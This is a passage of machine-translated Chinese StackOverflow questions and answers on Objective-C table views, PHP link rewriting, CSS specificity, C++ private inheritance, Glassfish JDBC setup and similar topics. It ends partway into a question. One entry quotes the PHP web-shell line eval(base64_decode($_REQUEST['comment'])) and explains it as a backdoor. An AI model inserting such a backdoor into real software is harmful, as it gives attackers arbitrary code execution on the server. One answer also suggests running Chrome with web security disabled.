# StackOverflow 问答 13870000-13870999

# objective-c - 未执行的方法

> ID：13870002
> 
> 赞同：-1
> 
> 时间：2012-12-13T22:57:08.113
> 
> 标签：objective-c, ios6, xcode4.5

我有一个 iPad 应用程序，使用 Storyboards、XCode 4.5 和 iOS6。在其中一个“场景”中，我在左上象限有一个 UITableView，在右象限有一些 UITextField，在下半部分有一个 UITableView。两 (2) 个 UITableView 没有控制器。问题是 numberOfRowsInSection 和 numberOfSectionsInTableView 永远不会被调用。

这是.h文件

```
#import <UIKit/UIKit.h>
#import "QuartzCore/QuartzCore.h"
#import "ClientInfo.h"

@interface ClientViewController : UIViewController <UITableViewDataSource, UITableViewDelegate>   {

}

@property (strong, nonatomic) IBOutlet UIView *clientView;
@property (strong, nonatomic) IBOutlet UIImageView *clientImage;
@property (strong, nonatomic) IBOutlet UITableView *previousAppointments;

@end 
```

这是.m文件

```
#import "ClientViewController.h"

@interface ClientViewController ()  {

}

@end

@implementation ClientViewController

//@synthesize clientPicture;

//-----------------------------------------------
- (void)viewDidLoad  {
#define kBorderWidth 2.0
#define kCornerRadius 8.0

    [super viewDidLoad];

    //  draw a border around UIImageView
    CALayer *borderLayer = [CALayer layer];
    CGRect borderFrame = CGRectMake(405, 50, 106, 106);  //  x, y, width, height
    [borderLayer setBackgroundColor:[[UIColor clearColor] CGColor]];
    [borderLayer setFrame:borderFrame];

    [borderLayer setCornerRadius:kCornerRadius];
    [borderLayer setBorderWidth:kBorderWidth];
    [borderLayer setBorderColor:[[UIColor blackColor] CGColor]];
    [self.clientView.layer addSublayer:borderLayer];

}

//------------------------------------------------
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {

    if (tableView == _clientView)  {
            // Return number of rows for first table view...
        }
    else if(tableView == _previousAppointments) {
            // Return number of rows for second table view...
        }
        return 0;
}

//---------------------------------------------------
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView  {

    return 1;  //  returns number of sections

}

//-------------------------------------------------

- (void)didReceiveMemoryWarning  {

    [super didReceiveMemoryWarning];
}

@end 
```

更新：我将 UITableViews 连接到数据源并使用 CTRL + 拖放对 Connections Inspector 进行委托。我现在收到此错误： ***由于未捕获的异常“NSInvalidArgumentException”而终止应用程序，原因：“-[UIView tableView:numberOfRowsInSection:]: unrecognized selector sent to instance 0xb86a4f0”

我做错了什么，或者做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:01:13.627

您是否检查过 View Controller 是否是 Table Views 数据源？

# php - php正则表达式添加链接到href

> ID：13870003
> 
> 赞同：2
> 
> 时间：2012-12-13T22:57:15.153
> 
> 标签：php, regex, html-parsing

嗨，我对编程很陌生。我不知道如何编写一个 php regulat 表达式来在 href=" 和之后的一些文本之间添加一些东西如何做到这一点

```
<a class="aaa" href="/some/file.html"> 
```

看起来像

```
<a class="aaa" href="http://www.example.com/some/file.html"> 
```

有必要将链接与“aaa”类匹配。

有谁能够帮我 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:00:37.767

[你最好不要开始尝试用正则表达式来做这件事。](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags/1732454#1732454)

对于这样的任务，您应该使用 DOM 解析器。[例如，这](http://simplehtmldom.sourceforge.net)使您的生活变得非常轻松。

```
$html = new simple_html_dom();
$html->load($input);

foreach($html->find('a[class=aaa]') as $link)
    $link->href = "http://www.example.com".$link->href;

$result = $html->save(); 
```

`find`让您可以很好地查询 DOM。参数是`tagtype[attributeName=attributeValue]`方括号是可选过滤器的位置。然后，您只需遍历此函数找到的每个链接，并在`href`属性前面加上您的域。

如果你因为某些原因不能使用第三方库，PHP 自带了一个内置的[DOM 模块](http://www.php.net/manual/en/book.dom.php)。代码不会那么短和优雅，但它仍然比尝试提出一个健壮的正则表达式更可取。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T23:03:05.980

你可以这样做：

```
$string = '<a class="aaa" href="/some/file.html">';
$pattern = '~class="aaa" href="(.*)"~isU'; 
preg_match($pattern, $string, $matches);

$string = str_replace($matches[1],"http://www.example.com".$matches[1],$string);

echo $string; 
```

编辑为匹配 class="aaa" 但如果您经常这样做，我也会推荐 m.buettners 方式。

# xcode - 为什么我的核心数据对象失去了它的关系？

> ID：13870005
> 
> 赞同：0
> 
> 时间：2012-12-13T22:57:36.670
> 
> 标签：xcode, core-data

我在 viewDidLoad 中有以下代码：

```
NSManagedObjectContext *moc=[[NSManagedObjectContext alloc]
                              initWithConcurrencyType:NSMainQueueConcurrencyType];
[moc setParentContext:[AppCoreDataHandler sharedManagedObjectContext]];
self.restroom=[NSEntityDescription insertNewObjectForEntityForName:@"Restroom"
                                            inManagedObjectContext:moc];
self.restroom.coordinate=[((AppDelegate *)[[UIApplication sharedApplication] delegate]) locationManager].location.coordinate;
self.review=[NSEntityDescription insertNewObjectForEntityForName:@"Review"
                                          inManagedObjectContext:moc];
[self.restroom addReviewsObject:self.review]; 
```

使用调试控制台进行的测试表明 self.restroom.reviews 等于包含评论的 NSSet。当我到达“viewWillAppear”时，self.restroom.reviews 为零。我没有在我的代码中将评论设置为 nil ANYWHERE。Self.review 始终保持完全有效。这根本没有意义！

我在我的智慧尽头试图弄清楚这一点。它不能是任何多线程代码，我没有为属性/关系分配任何其他内容，对象没有弱保留并释放自身，它只是......消失了。为什么？

编辑：更有趣的是，我使用键值观察来检查值何时更改。

根据我对堆栈跟踪的了解，它正在 viewDidLoad 函数内部进行更改。但是当我单步执行代码时，在函数结束后会清楚地发送键值通知。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T03:02:14.827

纯属愚蠢的运气（阅读：hrm，我想知道是否......不。好吧。我想知道是否......并重复大约两个亿万次迭代），我想通了。

我为这些对象创建的子 MOC 不是在最后一次引用它之后被释放（这是我期望 ARC 做的），而是在函数结束时释放。当它死亡时，它并没有解除分配它分配给的对象，但它*确实*剥夺了它们的关系。（我猜想，虽然它看起来像 NSSet 提供了这些，但它实际上是 MOC 内部的东西）。

# php - 使用 PHP Simple HTML DOM Parser 时忽略 MySQL 表的重复条目

> ID：13870006
> 
> 赞同：0
> 
> 时间：2012-12-13T22:57:39.987
> 
> 标签：php, mysql, dom

将数据插入表时，我无法获得以下代码以成功防止重复：

```
<?php
   include('simple_html_dom.php');  
    // Create DOM from URL
   $html = file_get_html('http://thesite.com/example/');

   // Find all article blocks

   $con = mysql_connect("localhost","admin","password");
    mysql_select_db("dataminer", $con);
   if (!$con)
    {
  die(mysql_error());
    }else {
   foreach($html->find('li.search-result') as $sitelisting){
 $escapedlisting = mysql_real_escape_string($sitelisting);
 $debugquery = mysql_query("INSERT IGNORE INTO extract (listing) VALUES ('$escapedlisting')");
    if (!$debugquery)
   {
   die(mysql_error());
  }
 }
 }
 mysql_close($con);
?> 
```

尽管有 INSERT IGNORE，但每次运行脚本时它仍然会复制每个条目。

**编辑：**通过更改解决此问题：

```
foreach($html->find('li.search-result') as $sitelisting){
     $escapedlisting = mysql_real_escape_string($sitelisting);
     $debugquery = mysql_query("INSERT IGNORE INTO extract (listing) VALUES ('$escapedlisting')"); 
```

至：

```
foreach($html->find('li.search-result') as $sitelisting){
    $item['address'] = mysql_real_escape_string($sitelisting->find('div.adr-flag', 0)->plaintext);
    $item['desc'] = mysql_real_escape_string($sitelisting->find('ul.attributes', 0)->plaintext);

    $debugquery = mysql_query("INSERT IGNORE INTO extract VALUES ('$item[address]', '$item[desc]')"); 
```

# css - 如何通过定位锚标记中的类来更改锚标记中的颜色或文本？

> ID：13870009
> 
> 赞同：0
> 
> 时间：2012-12-13T22:57:46.537
> 
> 标签：css

有人可以解释为什么会发生以下情况：

```
<a href="#" class="test">Test</a>

<style type="text/css">
.test {
border: thin solid blue;
color: red;
}
</style> 
```

这只会创建边框，但不会在使用类时将文本变为红色。

但是，这可以在使用 id 时将文本变为红色：

```
<a href="#" id="test">Test</a>

<style type="text/css">
#test {
border: thin solid blue;
color: red;
}
</style> 
```

为什么类不改变文本颜色，而使用 id 确实有效？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T23:08:21.503

用这个

[演示在这里](http://jsfiddle.net/mD5us/3/)

```
 <a href="#" class="test">Test</a>

 <style type="text/css">
a.test {
border: thin solid blue;
color: red;
}
</style> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-13T23:08:56.153

见这个例子：http: [//jsfiddle.net/mD5us/4/](http://jsfiddle.net/mD5us/4/)

```
<div>
    <a href="#" class="test">Test</a>
</div> 
```

CSS

```
​body div a.test{
    color:yellow;
}
body div .test{
    color:brown;
}
body a.test{
    color:purple;
}
body .test{
    color: orange;
}
a.test{
    color:green;
}
.test {
    border: thin solid blue;
    color: red;
} 
```

您可能认为链接是红色的，但实际上它是黄色的，因为这是最具体的声明。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-13T23:04:03.903

尝试将样式标签更改为：

```
<style type="text/css">
   a.test{
      border: thin solid blue;
      color: red;
   }
</style> 
```

# html - Chrome Inspector 中嵌套 IFrame 元素上的“复制为 HTML”

> ID：13870015
> 
> 赞同：4
> 
> 时间：2012-12-13T22:58:22.533
> 
> 标签：html, google-chrome, dom, iframe, google-chrome-devtools

在 Chrome 的网络检查器中，如果您右键单击一个 DOM 元素，则会有一个“复制为 HTML”选项，通常会为您提供该元素及其所有子元素的 HTML 字符串。但是，尽管 IFrame 标记的内容在检查器中显示为子节点，但它似乎从未包含这些内容。

该问题不是由跨域限制引起的：即使是同域 IFrame 也不会从复制的 HTML 中排除。

除了复制和粘贴每个嵌套 IFrame 的 HTML 根目录并在文本编辑器中手动将它们拼接在一起之外，有什么办法可以解决这个问题？我为一个网站工作，该网站的第三方广告脚本通常会生成大型、蔓延的嵌套 IFrame 树，我需要一种方法让同事能够复制和粘贴该结构，这样我就可以在不坐下来的情况下调试广告问题在他们的办公桌上。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T00:20:35.193

我相信谷歌浏览器已经在他们的浏览器中的某个地方硬编码了行为，但我没有时间找到代码部分。

这是一个解决方法，它将使用谷歌浏览器从网页上当前的所有 iframe 中获取 html。

## 设置：

*   关闭所有 Google Chrome 浏览器，然后在禁用网络安全的情况下启动 Google Chrome。否则运行`DisplayIframeContent.js`会产生这样的错误。

> 不安全的 JavaScript 尝试使用 URL 访问框架...

例子：

> cd LOCATION\OF\GOOGLE\CHROME
> chrome.exe --disable-web-security

加载 Google Chrome 时，您应该会看到一条黄色警告，说明：

> 您正在使用不受支持的命令行标志：--disable-web-security。稳定和安全将受到影响。

## 用法：

*   启动 Google Chrome 后，打开您的测试网站。
*   按`F12`打开开发工具。
*   [将jQuery](http://code.jquery.com/jquery-1.8.3.min.js)的内容复制并粘贴到控制台中。
*   `DisplayIframeContent.js`在控制台内复制并粘贴。

**DisplayIframeContent.js**

```
// @author Larry Battle <bateru.com/news> 12.13.2012
// requires jQuery 1.8.3+
clear();
if( !$("iframe").length ){
    console.log("No iframes were found");
}else{
    $("iframe").each(function (i) {
        console.log( "### iframe[%s].src = (%s)", i, $(this).attr("src") );
        console.log( $(this).contents().find("html").html() )
    });
}
"done"; 
```

*   从控制台复制并粘贴输出。

## 预期输出：

示例 URL：http: [//jsfiddle.net/28yrA/](http://jsfiddle.net/28yrA/) 输出：

```
### iframe[0].src = (javascript:false)
...HTML...
### iframe[1].src = (javascript:false)
...HTML...
### iframe[2].src = (javascript:false)
...HTML...
### iframe[3].src = (http://fiddle.jshell.net/28yrA/show/)
...HTML...
"done" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2020-01-22T16:02:19.483

我终于找到了一个解决方案，通过DW-dev的一个名为**Save Page WE的 Chrome 扩展程序。**

[https://chrome.google.com/webstore/detail/save-page-we/dhhpefjklgkmgeafimnjhojgjamoafof](https://chrome.google.com/webstore/detail/save-page-we/dhhpefjklgkmgeafimnjhojgjamoafof)

它也可用于 Firefox。 [https://addons.mozilla.org/en-US/firefox/addon/save-page-we/](https://addons.mozilla.org/en-US/firefox/addon/save-page-we/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-04-17T22:03:00.620

另一个答案可能有效，但我不喜欢仅仅为了复制一些 html 而禁用安全性。

恕我直言，这是另一种更简单的方式。

首先检查元素并复制元素，然后将其`iframe`粘贴到您要添加的任何位置。

结果应该是`iframe`带有所有属性的空标签：

```
<iframe src="src"></iframe> 
```

现在在里面`iframe`手动输入`#document`，`DOCTYPE`所以你现在有类似的东西：

```
<iframe>
    #document
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
</iframe> 
```

将 iframe 中文档的父节点复制为 html，它将复制所有子节点，就像您复制普通的 html 页面一样。

只需粘贴回 doctype 下，您就拥有了整个`iframe`. 最终结果应该是这样的

```
<iframe>
    #document
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html>
        <!-- All the child nodes -->
    </html>
</iframe> 
```

# php - PHP 代码利用 CPU

> ID：13870018
> 
> 赞同：0
> 
> 时间：2012-12-13T22:58:32.360
> 
> 标签：php, security, web

我需要理解下面的代码

```
eval(base64_decode($_REQUEST['comment'])); 
```

它利用了CPU，页面只包含这个代码

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T23:00:49.643

这*实际上*可以运行任何东西，所以没有办法知道。它从 $_REQUEST['comment'] 获取输入，base64 对其进行解码，然后将其作为 PHP 代码运行。

例如，如果`cGhwaW5mbygpOw==`通过，它将执行`phpinfo();`.

附带说明一下，这些类型的代码片段通常是危险信号，通常用作后门。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T23:01:30.343

此代码 base64_decodes 一些输入，然后将其评估为 PHP 代码。最终执行的内容取决于评论字段的内容。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-13T23:12:51.747

我猜你发现这个插入到你页面的代码中，这意味着你的网站在某种程度上受到了损害。这意味着实际上*任何人都*可以编写*任何*PHP 代码来执行*任何*操作，`base64_encode()`并将其发布到您的站点的“评论”字段中，然后服务器将执行它。

当您真正*注意到*它正在使用大量资源时，它可能被用于向某人发送垃圾邮件或 DOS，但只要该代码存在，它就可能被用来破坏您的服务器。

基本上，如果您发现以它开头的东西`eval(base64_decode(...`将会做坏事。

**资料来源：**在一家网络托管公司担任系统管理员 5 年。

# ios - XCode：我可以删除测试目标吗？

> ID：13870019
> 
> 赞同：61
> 
> 时间：2012-12-13T22:58:35.803
> 
> 标签：ios, xcode, xcode4.5

如果我删除我的应用程序的测试目标会发生什么？这会影响我的其他目标吗？我将如何正确删除目标？

* * *

## 回答 #1

> 赞同：104
> 
> 时间：2015-12-13T04:30:37.823

从项目导航器中选择“ **.xcodeproj ”文件，然后选择“****显示项目和目标列表**”图标，选择“**目标**”删除，然后单击底部的“ **- ”**

[![在此处输入图像描述](../Images/3966516c45e0d25a4c187ba9e3430083.png)](https://i.stack.imgur.com/dIWPC.png)

* * *

## 回答 #2

> 赞同：57
> 
> 时间：2012-12-14T19:43:06.967

如果测试目标是指单元测试目标，那么删除测试目标将意味着您无法对项目中的代码进行单元测试。删除测试目标不会影响项目中的其他目标。

要删除目标，请从项目导航器中选择您的项目以打开项目编辑器。从项目编辑器的左侧选择要删除的目标，然后按 Delete 键。

# c++ - 为什么在使用 dynamic_cast 和模板时出现错误“A 是 B 的不可访问的基础”？

> ID：13870020
> 
> 赞同：6
> 
> 时间：2012-12-13T22:58:41.003
> 
> 标签：c++

为什么调用`f`不解决第一个函数重载？我得到错误：

> `source.cpp: In function 'int main()':`
> `source.cpp:12:31: error: 'A' is an inaccessible base of 'B'`

```
class A {}; class B : A {};

void f(const A &)  { std::cout << "const A &"; }
template <typename T> void f(T) { std::cout << "Generic";  }

int main() {

   B b;

   f(dynamic_cast<const A &>(b));

} 
```

请注意，如果我取出`dynamic_cast`代码将工作，但*第二个* `f`被调用（它打印“通用”）。但我想做的是接到第一个电话。我认为 a`dynamic_cast`会起作用，但由于某种原因它会导致问题。我在这里做错了什么？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-13T23:00:30.043

默认类继承是私有的（`class B : A {};`默认为`class B : private A {};`）。

所以你`b`不能通过 type处理`A`。

编辑：就像 Rob 说的:)，修复它的方法是使用公共继承：

```
class B : public A {}; 
```

编辑：*公共*派生类与其基类
之间的关系是“是”，这意味着它是更通用类型的特化，因此，它实现了该通用类的行为，甚至可能更多。

 **私有*派生类与其基类之间的关系是“根据”实现的。它防止对象被视为基类的扩展。它使用的一个很好的例子是`boost::noncopyable`防止私有派生类的对象被复制。 [http://www.boost.org/doc/libs/1_52_0/libs/utility/utility.htm#Class_noncopyable](http://www.boost.org/doc/libs/1_52_0/libs/utility/utility.htm#Class_noncopyable)

在假设的情况下，要求包括私有继承，并且在某些时候创建了一个想要引用该对象作为其基类的函数，返回转换为基类指针的公共方法`this`将像传统`get()`访问私有数据成员一样做保持原来的目的。

```
public:
    A *getBase() { return static_cast<A *>(this); } 
```

然后像这样访问：

```
f(b.getBase()); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-13T23:04:04.357

`A`是 的**私有**基础`B`，因此很少有地方`B`可以将类型对象视为`A&`. 如果您将继承更改为 public，则强制转换将起作用，并选择非模板版本的`f`. 但是`dynamic_cast`大材小用；每个 type`B`的对象都是 type 的对象`A`，所以你可以用它`static_cast`来消除调用的歧义。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-13T23:03:13.527

在上播方面没有什么特别之处`dynamic_cast`。`dynamic_cast`相当于`static_cast`在这种情况下。如果基础存在、明确且可访问，则在编译时执行。否则无法编译。

这正是您的情况。基础是不可访问的（正如编译器已经告诉你的那样），所以转换无法编译。

如果没有强制转换，第一个函数将从重载解决候选列表中排除（因为基数不可访问），第二个函数获胜。

事实上，在绝大多数情况下，你真的不需要任何演员来执行*合法的向上转换。*至于非法向上转换，没有 C++ 转换可以帮助您（唯一可以“突破”私有继承的转换是 C 样式转换。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-13T23:04:45.073

如前所述，它会因为私有继承而失败，并且因为`b`是作为对象传递的。`dynamic_cast`仅适用于指针和引用。

见：[http ://www.cplusplus.com/doc/tutorial/typecasting/](http://www.cplusplus.com/doc/tutorial/typecasting/)*

# android - 为什么我的程序在 SQLite DatabaseHelper 类上调用 getWritableDatabase() 时会出错？

> ID：13870023
> 
> 赞同：1
> 
> 时间：2012-12-13T22:59:00.847
> 
> 标签：android, database, sqlite

我正在尝试在 Android 中创建一个数据库。这是导致错误的代码：

```
DatabaseHelper helper = new DatabaseHelper(getApplicationContext());
SQLiteDatabase db = helper.getWritableDatabase(); 
```

这是我的 DatabaseHelper 类：

```
package com.example.livelab;
import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

public class DatabaseHelper extends SQLiteOpenHelper {

  public static final String TABLE_CALLS = "calls";
  public static final String COLUMN_ID = "_id";
  public static final String COLUMN_CALL_NUMBER = "number";
  public static final String COLUMN_CALL_DATE = "date";
  public static final String COLUMN_CALL_DURATION = "duration";

  private static final String DATABASE_NAME = "LiveLab.db";
  private static final int DATABASE_VERSION = 1;

  // SQL statement for creating our CALLS table.
  private static final String CALLS_CREATE = "create table "
      + TABLE_CALLS + "(" + COLUMN_ID
      + " integer primary key autoincrement, " + COLUMN_CALL_NUMBER
      + " integer primary key autoincrement, " + COLUMN_CALL_DATE
      + " integer primary key autoincrement, " + COLUMN_CALL_DURATION
      + " text not null);";

   public DatabaseHelper(Context context) {
    super(context, DATABASE_NAME, null, DATABASE_VERSION);
   }

   @Override
   public void onCreate(SQLiteDatabase database) {
    database.execSQL(CALLS_CREATE);
   }

  @Override
  public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
    Log.w(DatabaseHelper.class.getName(),
        "Upgrading database from version " + oldVersion + " to "
             + newVersion + ", which will destroy all old data");
     db.execSQL("DROP TABLE IF EXISTS " + TABLE_CALLS);
    onCreate(db);
  }

} 
```

出于某种原因，调用 helper.getWritableDatabase() 会弹出一个新窗口，上面写着：

ActivityThread.handleCreateService(ActivityThread$CreateServiceData) 找不到源。

这是什么原因？

顺便说一句，这一切都在服务中，而不是在活动中。

# css - a：活动背景图片？

> ID：13870026
> 
> 赞同：0
> 
> 时间：2012-12-13T22:59:13.030
> 
> 标签：css, image, background, hover

在[我的网站](http://mmd3e12dae42.keaweb.dk)上，当我在活动的 div 框上时，我想改变侧面的点。悬停工作正常，但我无法让活动正常工作。当我试图将其悬停时，图像的路径工作正常。

```
#nav{
    z-index: 5;
    position: fixed;
    top: 50%;
    right: 20px;
}

#nav li {
    position: relative;
    height: 20px;
    width: 20px;
    margin-bottom: 15px;
}

#nav li a {
    display: block;
    width: 20px;
    height: 20px;
    text-indent: -9999px;
    background: transparent url('images/dot.png') no-repeat;    
    opacity: 0.80;
}

#nav li a:hover {
    opacity: 1; 
}

#nav li a:active {
    background: transparent url('images/dotactive.png') no-repeat;  
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:12:11.237

我认为仅使用 CSS 就不可能使图像保持为活动背景。您还需要使用 javascript 的组合。

使用 jQuery，您可以尝试类似下面的方法。

```
.active{background: url('images/dotactive.png') no-repeat !important;}

$('#nav li a').live('click',function () {
   $('.active').removeClass('active');
   $(this).addClass('active');
});​ 
```

**编辑**您的网站的 Workign 小提琴保持活动的导航背景图像。[http://jsfiddle.net/ukCG8/](http://jsfiddle.net/ukCG8/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T23:20:51.653

试试这个

```
 background: url('images/dotactive.png') no-repeat; 
```

不需要透明

或使用不透明度也用于透明度

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-13T23:28:43.493

尝试这个：

```
<script language="JavaScript" type="text/javascript">
/*<![CDATA[*/
var Lst;

function CngClass(obj){
 if (Lst) Lst.className='';
 obj.className='selected';
 Lst=obj;
}

/*]]>*/
</script> 
```

并像这样修改 li 项目：

```
<li>
<a onclick="CngClass(this);" href="#">Test 1
</a>
</li> 
```

我希望我能把修复归功于我；[在这里](http://www.webdeveloper.com/forum/showthread.php?167660-onclick-change-class-remove-when-next-link-clicked)查看实际情况（是的，我正在与另一个 Web 开发站点在 stackOverflow 上作弊！）

# awk - 使用 gsub 用两个双引号替换一个双引号？

> ID：13870029
> 
> 赞同：2
> 
> 时间：2012-12-13T22:59:25.487
> 
> 标签：awk

我正在尝试在 awk 中编写一个脚本，该脚本（除其他外）用两个连续的双引号替换所有双引号实例。但是由于某种原因，我似乎无法正确地转义我的双引号。

例如：

```
Mary had a "little" lamb 
```

会成为

```
Mary had a ""little"" lamb 
```

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T23:02:21.860

你可以这样做：

```
echo 'Mary had a "little" lamb' | awk '{ gsub(/"/, "&&") } 1' 
```

输出：

```
Mary had a ""little"" lamb 
```

最后`1`调用 awk 的默认块`{ print $0 }`。

使用 sed 更短：

```
echo 'Mary had a "little" lamb' | sed 's/"/&&/g' 
```

# java - 无法在 Glassfish3 上使用 JDBC 连接到数据库

> ID：13870037
> 
> 赞同：4
> 
> 时间：2012-12-13T22:59:46.297
> 
> 标签：java, oracle, jdbc, glassfish

有什么方法可以检查我的 Glassfish 是否真的看到 ojdbc6.jar ？

我正在使用 Netbeans 7.2.1、JSF 2、Glassfish 3.1.2 和 Oracle 11g。我想连接到这个数据库。

所以首先我需要在我的 Glassfish 中创建连接池。我打开 localhost:4848 设置 5 件事：

1.  资源类型：javax.sql.DataSource
2.  数据源类名：oracle.jdbc.pool.OracleDataSource
3.  属性：“用户”
4.  属性：“密码”
5.  属性：“网址”

保存，重置服务器（只是肯定的），ping ....和错误：**类名错误或未设置类路径：oracle.jdbc.pool.OracleDataSource**

我已经做了什么：

1.  首先检查 ojdbc jar。从我的 Oracle 目录中，我将每个名称为“ojdbc”的 jar 复制到“C:\glassfish3\glassfish\domains\domain1\lib”中。

2.  其次，检查 url 属性。在 Netbeans 中，切换到服务选项卡，右键单击数据库，新连接...设置要连接的数据（首先我必须添加 jodbc6.jar.. 所以我添加完全相同的文件 - 从 glassfish 文件夹）。有用！连接正常。我查看了 Netbeans 数据库 url - 与我在 glassfish gui 中的 url 相同。我也尝试了带有\的url，但没有帮助。

那么，还能是什么呢？也许no.1不行。所以这是我的问题：**如何检查我的 Glassfish 是否真的看到了 ojdbc6.jar？**

编辑。当我运行 Glassfish 时，我收到一些警告：

> 警告：存在多个 [2] JMX MBeanServer 实例，我们将使用索引 [0] 处的服务器：[com.sun.enterprise.v3.admin.DynamicInterceptor@704d54]。
> 
> 警告：正在使用的 JMX MBeanServer：来自索引 [0] 的 [com.sun.enterprise.v3.admin.DynamicInterceptor@704d54]
> 
> 警告：正在使用的 JMX MBeanServer：来自索引 [1] 的 [com.sun.jmx.mbeanserver.JmxMBeanServer@ed312d]

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-12-14T12:52:55.067

将所有需要的 jar 文件（ojdbc6.jar.....）复制到“domains\domain1\lib\ext”文件夹。然后重新启动你的 glassfish。然后尝试从 glassfish ping，它会工作

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-08-20T23:21:31.890

“..但是你怎么知道它是'ext'文件夹？而不仅仅是'lib'？一个人说lib，另一个ext..”

> 使 JDBC 驱动程序 JAR 文件可访问 要将 JDBC 驱动程序集成到 GlassFish Server 域中，请将 JAR 文件复制到 domain-dir/lib 目录中，然后重新启动服务器。这使得部署在共享相同配置的服务器上的所有应用程序或模块都可以访问类。有关 GlassFish Server 类加载器的详细信息，请参阅 GlassFish Server 开源版应用程序开发指南中的“类加载器”。如果您使用的是带有 EclipseLink 扩展的 Oracle 数据库，请将 JAR 文件复制到 domain-dir/lib/ext 目录中，然后重新启动服务器。有关详细信息，请参阅 GlassFish Server 开源版应用程序开发指南中的“Oracle 数据库增强”

[从这里](https://glassfish.java.net/docs/4.0/administration-guide.pdf)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-09-25T15:42:17.813

请注意，当 NetBeans 在 Windows 上运行 glassfish 时，它使用的“域”目录位于您的主目录中，而不是位于`C:\glassfish`或`C:\Program Files\glassfish`

在我的 Windows 7 上，运行带有 Glassfish 4.1 的 NetBeans 8.0.2，我必须将 Oracle 驱动程序 jar (ojdbc6.jar) 放入

```
c:/Users/t823517/AppData/Roaming/NetBeans/8.0.2/config/GF_4.1/domain1 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-14T17:37:32.590

如果您从 IDE 运行 glassfish，可能是 netbeans 创建虚拟应用程序。试试这种添加罐子的方法：http: [//netbeans.org/kb/docs/javaee/entappclient.html](http://netbeans.org/kb/docs/javaee/entappclient.html)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-04-28T00:49:23.423

将 ojdbc6-11.1.0.jar（在您的情况下 ojdbc6 版本可能不同）复制到 glassfish_installation\glassfish\lib

重启 glassfish 服务器

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-12-17T19:59:51.533

对于 payara 服务器，我将 ojdbc jar 复制到 {payara_installation_folder}\glassfish\lib，它工作正常

# javascript - 如何在不创建滚动条的情况下用画布元素填充浏览器窗口？

> ID：13870038
> 
> 赞同：0
> 
> 时间：2012-12-13T22:59:58.647
> 
> 标签：javascript, html, fullscreen

我在获取窗口大小时遇到​​问题，我尝试以下代码：

**Javascript**

```
var game;
function game() {
    this.canvas = document.getElementById('canvas');
    this.canvasWidth = window.innerWidth;
    this.canvasHeight = window.innerHeight;    
    this.initCanvas = function() {
        this.canvas.style.width = this.canvasWidth + "px";
        this.canvas.style.height = this.canvasHeight + "px";
    }
    this.run = function() {
        this.initCanvas();
    }
}
game = new game();
game.run(); 
```

我也有

**CSS**

```
html, body {
    padding: 0;
    margin: 0;
} 
```

我的身体里只有一块帆布。

问题是，我有一个垂直和水平滚动条。这意味着画布的尺寸太大。如何在不出现滚动条的情况下使其成为窗口大小？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T23:24:27.117

看起来您只是想让画布的宽度和高度为 100%。你可以用 css 做到这一点：

**HTML**

```
<body>
    <canvas id="canvas"></canvas>
</body> 
```

**CSS**

```
body, html {
    height: 100%;
    width: 100%;
    margin: 0px;
}
canvas {
    background: #ffcccc;
    height: 100%;
    width: 100%;
    display: block;
}
​ 
```

**[演示](http://jsfiddle.net/RG6dn/)**

或者如果你想使用你的代码但去掉窗口上的滚动条，你需要`block`在画布标签上指定。

**CSS**

```
canvas {
    display: block;
} 
```

**[演示](http://jsfiddle.net/RG6dn/1/)**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-13T23:49:28.003

当您使用 CSS 为`<canvas>`元素设置样式时，它将被缩放而不是调整大小。请务必在元素上设置`.width`and`.height`属性（即not ）。`canvas``canvas.width``canvas.style.width`

[jsfiddle 示例](http://jsfiddle.net/RG6dn/2/)

在示例中，第一个画布元素正确缩放，第二个（使用 CSS）未正确缩放。这与 CSS 缩放的默认画布元素大小（300x150）有关。

为了防止在将 设置`<canvas>`为完整窗口宽度/高度时出现滚动条，请将 设置`body`为`overflow:hidden;`上面 jsfiddle 中使用的。

# ajax - 在 Wicket 中使用 Ajax 的动态表单

> ID：13870039
> 
> 赞同：0
> 
> 时间：2012-12-13T23:00:03.343
> 
> 标签：ajax, forms, dynamic, drop-down-menu, wicket

我有的：

